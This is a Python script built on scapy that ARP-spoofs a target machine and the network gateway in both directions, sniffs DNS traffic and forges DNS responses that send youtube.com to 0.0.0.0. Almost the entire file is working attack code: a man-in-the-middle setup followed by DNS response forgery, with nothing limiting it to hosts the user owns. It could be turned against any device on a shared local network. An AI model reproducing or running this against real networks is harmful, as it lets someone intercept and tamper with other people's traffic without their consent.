import constants
import scapy.all as scapy
import threading
import time


# Function to perform ARP spoofing
def arp_spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Function to get MAC address from IP address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# Function to perform ARP spoofing continuously
def arp_spoof_loop(target_ip, target_mac, spoof_ip, interval=2):
    while True:
        arp_spoof(target_ip, target_mac, spoof_ip)
        time.sleep(interval)


# Function to sniff DNS packets
def sniff_dns():
    scapy.sniff(filter="udp port 53", prn=process_dns_packet, store=False)


# Function to process DNS packets
def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSRR):
        dns_name = packet[scapy.DNSQR].qname.decode()
        if dns_name == "youtube.com":  # Replace with the domain you want to block
            # Block legitimate DNS responses from the router
            # Here you'd use packet filtering techniques (e.g., iptables) to drop these packets

            # Craft a DNS response packet indicating failure
            ip_layer = packet.getlayer(scapy.IP)
            udp_layer = packet.getlayer(scapy.UDP)
            dns_layer = packet.getlayer(scapy.DNS)
            forged_DNSRR = scapy.DNSRR(rrname=dns_layer.qd.qname, ttl=3600, rdlen=4, rdata="0.0.0.0")
            forged_pkt = scapy.IP(src=ip_layer.dst, dst=ip_layer.src) / \
                         scapy.UDP(sport=udp_layer.dport, dport=udp_layer.sport) / \
                         scapy.DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=forged_DNSRR)
            # Send the forged DNS response packet
            scapy.send(forged_pkt, verbose=False)


# Main function
if __name__ == "__main__":
    target_ip = constants.this_pc_ip
    gateway_ip = constants.GATEWAY_IP

    # Get MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    try:
        # Start ARP spoofing threads
        arp_thread_target = threading.Thread(target=arp_spoof_loop, args=(target_ip, target_mac, gateway_ip))
        arp_thread_gateway = threading.Thread(target=arp_spoof_loop, args=(gateway_ip, gateway_mac, target_ip))
        arp_thread_target.start()
        arp_thread_gateway.start()

        # Start DNS packet sniffing
        sniff_thread = threading.Thread(target=sniff_dns)
        sniff_thread.start()

        # Keep the program running
        while True:
            continue

    except KeyboardInterrupt:
        print("[+] Detected Ctrl+C, Exiting...")
